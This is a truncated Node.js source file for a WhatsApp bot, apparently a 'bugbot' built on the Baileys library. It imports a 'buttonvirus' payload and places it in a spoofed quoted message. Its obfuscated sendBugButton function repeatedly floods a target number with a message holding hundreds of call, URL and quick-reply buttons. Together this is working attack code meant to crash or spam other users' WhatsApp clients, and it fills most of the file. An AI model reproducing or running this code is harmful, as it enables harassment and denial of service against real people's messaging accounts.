require('../connection/settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@adiwajshing/baileys");
const fs = require("fs");
const chalk = require("chalk");
const crypto = require("crypto");
const axios = require("axios");
const moment = require("moment-timezone");
const fetch = require("node-fetch");
const util = require("util");
const cheerio = require("cheerio");
const { sizeFormatter} = require("human-readable")
const format = sizeFormatter()
const { color, bgcolor, mycolor } = require('./lib/color')
const { smsg, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat } = require('./lib/functions')
const { buttonvirus } = require('./lib/buttonvirus')

const addusrp = JSON.parse(fs.readFileSync('./nodeJS/database/user.json'))
const bugchat = JSON.parse(fs.readFileSync('./nodeJS/database/akses.json'))

module.exports = lexxy = async (lexxy, m, chatUpdate, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°#*+,.?=''():√%!¢£¥€π¤ΠΦ_&`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°#*+,.?=''():√%¢£¥€π¤ΠΦ_&!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
const content = JSON.stringify(m.message)
const { type, quotedMsg, mentioned, now, fromMe } = m
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await lexxy.decodeJid(lexxy.user.id)
const isDeveloper = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isMeLexx = [botNumber, ...global.bugrup].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isAkses = [botNumber, ...bugchat].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)

const { chats } = m

const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')

const isGroup = m.chat.endsWith('@g.us')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await lexxy.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isQuotedMsg = (type == 'extendedTextMessage')

if (!lexxy.public) {
if (!m.key.fromMe) return
}

if (isCmd && m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Group Chat"), chalk.bold('[' + args.length + ']')); }
if (isCmd && !m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Private Chat"), chalk.bold('[' + args.length + ']')); }
	
try {
ppuser = await lexxy.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = lexxy.sendMessage(from, { text: teks, mentions: mems }, { quoted: m })
return res
} else {
let res = lexxy.sendMessage(from, { text: teks, mentions: mems }, { quoted: m })
return res
}
}

const mentionByTag = type == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || "" : ""
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []

const createPassword = (size) => {
return crypto.randomBytes(size).toString('hex').slice(sender, size)
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}

let fakelex = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${runtime(process.uptime())}`, jpegThumbnail: ppnyauser}}}

const cpimage = async (caption) => {
lexxy.sendMessage(from,{text:caption},{quoted:fakelex})
}

const sendBugButton = async (target,jumlahnya) => {
for (let i = 0; i < jumlahnya; i++) {
var _0x284dbf=_0x2bea;function _0x2bea(_0x16e8bb,_0x5302a4){var _0x2f3193=_0x2f31();return _0x2bea=function(_0x2bea30,_0x1f0b80){_0x2bea30=_0x2bea30-0x148;var _0x4e6231=_0x2f3193[_0x2bea30];return _0x4e6231;},_0x2bea(_0x16e8bb,_0x5302a4);}function _0x2f31(){var _0x436bc0=['sendMessage','5633530pbnnDI','4kHRuYl','16NbVEsE','https://www.whatsapp.com/otp/copy/','21745100cEwVOb','315637FIhhHA','4905AZMoCe','3724GyOCoi','55938soMvLI','826584Ayijfc','☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','4791294QpkBqS'];_0x2f31=function(){return _0x436bc0;};return _0x2f31();}(function(_0x41ca56,_0x412a03){var _0x4603b2=_0x2bea,_0xcc9bd3=_0x41ca56();while(!![]){try{var _0x2fcc86=-parseInt(_0x4603b2(0x152))/0x1+parseInt(_0x4603b2(0x14e))/0x2*(parseInt(_0x4603b2(0x148))/0x3)+parseInt(_0x4603b2(0x154))/0x4*(parseInt(_0x4603b2(0x153))/0x5)+-parseInt(_0x4603b2(0x149))/0x6+-parseInt(_0x4603b2(0x14d))/0x7+parseInt(_0x4603b2(0x14f))/0x8*(-parseInt(_0x4603b2(0x14b))/0x9)+parseInt(_0x4603b2(0x151))/0xa;if(_0x2fcc86===_0x412a03)break;else _0xcc9bd3['push'](_0xcc9bd3['shift']());}catch(_0x273efb){_0xcc9bd3['push'](_0xcc9bd3['shift']());}}}(_0x2f31,0xc3d8e),lexxy[_0x284dbf(0x14c)](target,{'text':tanggal+'-'+tanggal+'-'+tanggal,'templateButtons':[{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20